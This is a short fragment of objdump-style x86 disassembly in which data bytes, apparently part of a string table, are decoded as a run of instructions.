  4295f0:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  4295f8:	outs   dx,DWORD PTR ds:[esi]
  4295f9:	ins    DWORD PTR es:[edi],dx
  4295fa:	add    BYTE PTR [ebx+0x72],al
  4295fd:	je     0x429653
  4295ff:	push   0x64616572
  429604:	inc    ebp
  429605:	js     0x429648
  429607:	inc    eax
  429608:	cmp    BYTE PTR [eax],al
